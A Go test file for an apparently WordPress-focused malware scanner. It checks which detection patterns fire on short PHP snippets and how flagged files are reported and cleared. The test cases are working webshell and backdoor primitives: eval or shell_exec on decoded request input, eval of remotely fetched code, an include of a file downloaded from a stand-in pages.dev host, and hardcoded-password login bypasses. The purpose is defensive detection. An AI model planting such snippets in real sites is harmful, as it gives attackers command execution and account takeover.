package scan

import (
	"os"
	"slices"
	"strings"
	"testing"
)

func matchedNames(body string) []string {
	var names []string
	for _, m := range matchContent([]byte(body)) {
		names = append(names, m.pattern.name)
	}
	return names
}

func TestContentPatterns(t *testing.T) {
	for _, c := range []struct {
		body string
		want []string
	}{
		{`<?php eval(base64_decode('ZWNobyAxOw=='));`, []string{"eval-decoded"}},
		{`<?php @EVAL( @gzinflate(str_rot13($x)));`, []string{"eval-decoded"}},
		{`<?php system($_GET['c']);`, []string{"exec-request"}},
		{`<?php assert(stripslashes($_REQUEST["x"]));`, []string{"exec-request"}},
		{`<?php $_POST['f']($_POST['a']);`, []string{"request-call"}},
		{`<?php preg_replace("/.*/e", $_POST['x'], "");`, []string{"preg-replace-eval"}},
		{`<?php @include "/var/www/wp-content/favicon_1a2b3c.ico";`, []string{"include-non-php"}},
		{`<?php $auth_pass = ""; // FilesMan`, []string{"webshell"}},
		// Encoded code that calls what a shell calls.
		{`<?php $f = "\x65\x76\x61\x6c\x28\x24\x5f\x50\x4f\x53\x54\x5b\x31\x5d\x29";`, []string{"encoded-call"}},
		{`<?php $f = "ev\x61\x6c\x28\x24_POST[1])";`, []string{"encoded-call"}},
		{`<?php $f = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109).chr(40);`, []string{"encoded-call"}},
		{`<?php $p = 'PD9waHAgaWYgKGlzc2V0KCRfUE9TVFsnayddKSkgeyBldmFsKCRfUE9TVFsnayddKTsgfSAvLyBwYWRkaW5nIHBhZGRpbmcgcGFkZGluZyBwYWRkaW5nIHBhZGRpbmc=';`, []string{"encoded-payload"}},
		// Encoded data that isn't code: fonts, images, barcodes.
		{`<?php $font = "\x00\x01\x00\x00\x00\x0f\x00\x80\x00\x03\x00\x70";`, nil},
		{`<?php $bar = chr(27).chr(64).chr(29).chr(104).chr(80);`, nil},
		{`<?php $img = 'data:image/png;base64,AAECAwQFBgcICQoLDA0ODxAREhMUFRYXGBkaGxwdHh8gISIjJCUmJygpKissLS4vMDEyMzQ1Njc4OTo7PD0+P0BBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWltcXV5fYGFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6e3x9fn+AgYKDhIWGh4iJiouMjY6PkJGSk5SVlpeYmZqbnJ2en6ChoqOkpaanqKmqq6ytrq+wsbKztLW2t7i5uru8vb6/wMHCw8TFxsfIycrLzM3Oz9DR0tPU1dbX2Nna29zd3t/g4eLj5OXm5+jp6uvs7e7v8PHy8/T19vf4+fr7/P3+/wABAgMEBQYHCAkKCwwNDg8QERITFBUWFxgZGhscHR4fICEiIyQlJicoKSorLC0uLzAxMjM0NTY3ODk6Ozw9Pj9AQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVpbXF1eX2BhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ent8fX5/gIGCg4SFhoeIiYqLjI2Oj5CRkpOUlZaXmJmam5ydnp+goaKjpKWmp6ipqqusra6vsLGys7S1tre4ubq7vL2+v8DBwsPExcbHyMnKy8zNzs/Q0dLT1NXW19jZ2tvc3d7f4OHi4+Tl5ufo6err7O3u7/Dx8vP09fb3+Pn6+/z9/v8=';`, nil},

		// Techniques of backdoor kits found on managed sites, in short.
		{"<?php $d = base64_decode(isset($_POST['d']) ? $_POST['d'] : '');\nif ($d) { echo @shell_exec($d . ' 2>&1'); }", []string{"exec-decoded-input"}},
		{"<?php $r = wp_remote_get($u);\n$code = wp_remote_retrieve_body($r);\neval(\"?>\" . $code);", []string{"eval-remote"}},
		{"<?php $t = tmpfile(); $p = stream_get_meta_data($t)['uri'];\nfwrite($t, file_get_contents('https://x.pages.dev/m.jpg'));\n@include $p;", []string{"include-remote"}},
		{"<?php $p = '$2a$12$.te0/UQxvoLTVGI7f3hKueXhzcyvqyHrXjqB3duEK6N0hxA2MjD8O';\nif (!password_verify($_COOKIE['p'] ?? '', $p)) exit;", []string{"hardcoded-credential"}},
		{"<?php $p = '078f6f47c30e2b3da46419db80f408e7a38495d8';\nif (hash_equals($p, sha1($_GET['k']))) { wp_set_auth_cookie(1); }", []string{"hardcoded-credential"}},
		{"<?php $u = 'htt'.'ps:'.'//p'.'ub-'.'9b7'.'7b8'.'4a7'.'.r2'.'.de'.'v/x'.'.ht'.'ml';", []string{"split-strings"}},
		{"<?php /* Purger like Alfa Shell */", []string{"webshell"}},

		// What plugins and themes do every day.
		{"<?php $state = json_decode(base64_decode($_GET['state']), true);\n$pdo->exec($sql);", nil},
		{"<?php $response = wp_remote_get($url);\n$body = wp_remote_retrieve_body($response);\n$data = json_decode($body);", nil},
		{"<?php $file = get_template_directory() . '/parts/' . $name . '.php';\ninclude $file;", nil},
		{"<?php if (password_verify($_POST['pwd'], $user->user_pass)) { login(); }", nil},
		{"<?php if (hash_equals($stored, hash_hmac('sha256', $_GET['token'], $key))) {}", nil},
		{"<?php $class = 'wp-block-' . $name . ' ' . $extra;", nil},
		// LearnDash's doc comments, and WP Crontrol's PHP cron events
		// with an unrelated request elsewhere in the file.
		{"<?php\n/**\n * @var $_GET['action'] (string) is set if paginating\n */", nil},
		{"<?php\nwp_remote_post($cron_url, $args);\n" + strings.Repeat("// ...\n", 400) + "function run($code) {\n\teval( $code );\n}", nil},
		// Commands run from decoded data, as in Smart Slider 3 Pro 3.5.1.35.
		{"<?php $ck = $_SERVER['HTTP_X_CACHE_KEY'];\necho @shell_exec(base64_decode($ck) . ' 2>&1');", []string{"eval-decoded"}},
		{`<?php $data = json_decode(base64_decode($encoded), true);`, nil},
		{`<?php if (isset($_GET['page'])) { $page = sanitize_key($_GET['page']); }`, nil},
		{`<?php include __DIR__ . '/templates/header.php';`, nil},
		{`<?php preg_replace('/\s+/', ' ', $text);`, nil},
		{`<?php preg_replace("/[^a-z0-9]+/i", '-', $slug);`, nil},
		{`<?php call_user_func($callback, $args);`, nil},
		{`<?php $wso = get_option('wso_settings');`, nil},
		{`<?php // eval() is evil, so we don't use it`, nil},
	} {
		if got := matchedNames(c.body); !slices.Equal(got, c.want) {
			t.Errorf("%s\nmatched %q, want %q", c.body, got, c.want)
		}
	}
}

func TestContentScan(t *testing.T) {
	root := t.TempDir()
	owner := uint32(os.Getuid())
	writeFile(t, root, "wp-content/themes/x/functions.php", "<?php add_action('init', 'x');")
	writeFile(t, root, "wp-content/themes/x/inc/cache.php", "<?php eval(base64_decode($_COOKIE['k']));")
	writeFile(t, root, "wp-content/plugins/custom/custom.php", "<?php\n/* Plugin Name: Custom\nVersion: 1 */\n$_POST['f']($_POST['a']);")
	writeFile(t, root, "wp-content/plugins/akismet/akismet.php", "<?php\n/* Plugin Name: Akismet\nVersion: 5.3 */\n// FilesMan")
	writeFile(t, root, "wp-content/uploads/data.php", "<?php exit; ?>eval(base64_decode('x'))")
	akismet := &PluginChecksums{Slug: "akismet", Version: "5.3", SHA256: map[string][]string{
		"akismet.php": {sha256Of("<?php\n/* Plugin Name: Akismet\nVersion: 5.3 */\n// FilesMan")},
	}}

	// The hourly walk doesn't search files it has no other reason to read.
	hourly, _ := Walk(root, owner, Options{})
	if got := contentEntries(hourly.Entries); len(got) != 0 || hourly.ContentChecked {
		t.Fatalf("hourly walk flagged %q", got)
	}

	// The content scan searches every PHP file, except the ones a
	// checksum vouches for and data files that exit first.
	nightly, _ := Walk(root, owner, Options{Content: true, Plugins: map[string]*PluginChecksums{"akismet": akismet}})
	want := []string{
		"eval-decoded,exec-request,exec-decoded-input wp-content/themes/x/inc/cache.php",
		"request-call wp-content/plugins/custom/custom.php",
	}
	if got := contentEntries(nightly.Entries); !slices.Equal(got, want) || !nightly.ContentChecked {
		t.Fatalf("content scan flagged %q, want %q", got, want)
	}
	findings := Evaluate(map[string]Entry{}, nightly.Entries, owner, func(uint32) string { return "u" })
	if len(findings) != 2 || findings[0].Severity != "high" || !strings.Contains(findings[0].Detail, "(line 4)") || findings[0].SHA256 == "" {
		t.Fatalf("findings = %+v", findings)
	}

	// Later walks search the flagged files again: unchanged, they aren't
	// reported again; cleaned, they're cleared.
	prev := NewState(nightly.Entries)
	watch := Options{Watch: prev.Watched()}
	again, _ := Walk(root, owner, watch)
	if got := contentEntries(again.Entries); !slices.Equal(got, want) {
		t.Fatalf("watched walk flagged %q", got)
	}
	if f := Evaluate(prev.Entries, again.Entries, owner, func(uint32) string { return "u" }); len(f) != 0 {
		t.Fatalf("flagged again: %+v", f)
	}
	writeFile(t, root, "wp-content/themes/x/inc/cache.php", "<?php // cleaned")
	cleaned, _ := Walk(root, owner, watch)
	cleared := Cleared(prev.Entries, cleaned.Entries, owner, true, func(string) bool { return true })
	if len(cleared) != 1 || cleared[0].Path != "wp-content/themes/x/inc/cache.php" || cleared[0].Detail != ClearedFixed {
		t.Fatalf("cleared = %+v", cleared)
	}
}

func contentEntries(entries []Entry) []string {
	var got []string
	for _, e := range entries {
		if len(e.Content) > 0 {
			got = append(got, strings.Join(e.Content, ",")+" "+e.Path)
		}
	}
	slices.Sort(got)
	return got
}
